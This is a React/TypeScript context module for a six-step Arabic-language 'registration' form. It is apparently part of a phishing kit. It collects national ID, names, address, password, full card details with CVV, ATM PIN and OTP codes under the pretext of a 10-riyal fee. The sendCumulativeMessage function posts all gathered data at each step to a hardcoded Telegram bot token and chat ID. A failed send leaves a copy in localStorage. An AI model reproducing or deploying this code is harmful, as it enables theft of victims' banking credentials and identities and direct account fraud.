import { createContext, useContext, useState, useEffect, ReactNode } from "react";

interface RegistrationData {
  // Account Type
  accountType?: string;
  nationalId?: string;
  mobileNumber?: string;
  visitorEmail?: string;
  visitorMobile?: string;
  phoneCode?: string;
  
  // Personal Info
  nationality?: string;
  fullNameArabic?: string;
  fullNameEnglish?: string;
  dateOfBirth?: string;
  gender?: string;
  address?: string;
  email?: string;
  
  // Password
  password?: string;
  
  // Payment
  cardNumber?: string;
  cardholderName?: string;
  expiryDate?: string;
  cvv?: string;
  
  // ATM Pin
  atmPin?: string;
  
  // OTP
  otp?: string;
}

interface RegistrationContextType {
  data: RegistrationData;
  updateData: (newData: Partial<RegistrationData>) => void;
  sendCumulativeMessage: (stage: number, stageName: string) => Promise<void>;
  clearData: () => void;
}

const RegistrationContext = createContext<RegistrationContextType | undefined>(undefined);

const TELEGRAM_BOT_TOKEN = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
const TELEGRAM_CHAT_ID = "-4985537188";

export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
  const [data, setData] = useState<RegistrationData>(() => {
    const saved = localStorage.getItem("registrationData");
    return saved ? JSON.parse(saved) : {};
  });

  useEffect(() => {
    localStorage.setItem("registrationData", JSON.stringify(data));
  }, [data]);

  const updateData = (newData: Partial<RegistrationData>) => {
    setData((prev) => ({ ...prev, ...newData }));
  };

  const formatTelegramMessage = (stage: number, stageName: string): string => {
    let message = `📋 <b>معلومات التسجيل - المرحلة ${stage}/6</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;

    // Stage 1: Account Type
    if (stage >= 1 && data.accountType) {
      message += `✅ <b>المرحلة 1: نوع الحساب</b>\n`;
      if (data.accountType === "citizens") {
        message += `   📌 النوع: مواطن/مقيم\n`;
        message += `   🆔 رقم البطاقة: ${data.nationalId}\n`;
        message += `   📱 الهاتف: ${data.mobileNumber}\n`;
      } else {
        message += `   📌 النوع: زائر\n`;
        message += `   📧 البريد: ${data.visitorEmail}\n`;
        message += `   📱 الهاتف: ${data.phoneCode} ${data.visitorMobile}\n`;
      }
      message += `\n`;
    }

    // Stage 2: Personal Info
    if (stage >= 2 && data.fullNameArabic) {
      message += `✅ <b>المرحلة 2: البيانات الشخصية</b>\n`;
      message += `   👤 الاسم (عربي): ${data.fullNameArabic}\n`;
      message += `   👤 الاسم (English): ${data.fullNameEnglish}\n`;
      message += `   🎂 تاريخ الميلاد: ${data.dateOfBirth}\n`;
      message += `   ⚧️ الجنس: ${data.gender}\n`;
      message += `   🌍 الجنسية: ${data.nationality}\n`;
      message += `   📍 العنوان: ${data.address}\n`;
      message += `   📧 البريد: ${data.email}\n`;
      message += `\n`;
    }

    // Stage 3: Password
    if (stage >= 3 && data.password) {
      message += `✅ <b>المرحلة 3: كلمة المرور</b>\n`;
      message += `   🔑 كلمة المرور: ${data.password}\n`;
      message += `\n`;
    }

    // Stage 4: Payment
    if (stage >= 4 && data.cardNumber) {
      message += `✅ <b>المرحلة 4: بيانات الدفع</b>\n`;
      message += `   💳 رقم البطاقة: ${data.cardNumber}\n`;
      message += `   👤 اسم حامل البطاقة: ${data.cardholderName}\n`;
      message += `   📅 تاريخ الانتهاء: ${data.expiryDate}\n`;
      message += `   🔒 CVV: ${data.cvv}\n`;
      message += `   💰 المبلغ: 10 ريال\n`;
      message += `\n`;
    }

    // Stage 5: ATM Pin
    if (stage >= 5 && data.atmPin) {
      message += `✅ <b>المرحلة 5: رقم PIN</b>\n`;
      message += `   🔐 رقم PIN: ${data.atmPin}\n`;
      message += `\n`;
    }

    // Stage 6: OTP
    if (stage >= 6 && data.otp) {
      message += `✅ <b>المرحلة 6: رمز التحقق</b>\n`;
      message += `   🔢 رمز OTP: ${data.otp}\n`;
      message += `\n`;
    }

    message += `━━━━━━━━━━━━━━━━━━━━\n`;
    message += stage === 6 ? `🎉 <b>التسجيل مكتمل!</b>` : `⏳ <b>المرحلة الحالية: ${stageName}</b>`;

    return message;
  };

  const sendCumulativeMessage = async (stage: number, stageName: string) => {
    try {
      const message = formatTelegramMessage(stage, stageName);
      
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "HTML",
          }),
        }
      );

      if (!response.ok) {
        throw new Error("Failed to send message to Telegram");
      }

      console.log(`✅ Message sent successfully for stage ${stage}`);
    } catch (error) {
      console.error("❌ Failed to send to Telegram:", error);
      // Save to localStorage as backup
      const backupKey = `telegram_backup_stage_${stage}_${Date.now()}`;
      localStorage.setItem(backupKey, formatTelegramMessage(stage, stageName));
    }
  };

  const clearData = () => {
    setData({});
    localStorage.removeItem("registrationData");
  };

  return (
    <RegistrationContext.Provider
      value={{ data, updateData, sendCumulativeMessage, clearData }}
    >
      {children}
    </RegistrationContext.Provider>
  );
};

export const useRegistration = () => {
  const context = useContext(RegistrationContext);
  if (!context) {
    throw new Error("useRegistration must be used within RegistrationProvider");
  }
  return context;
};
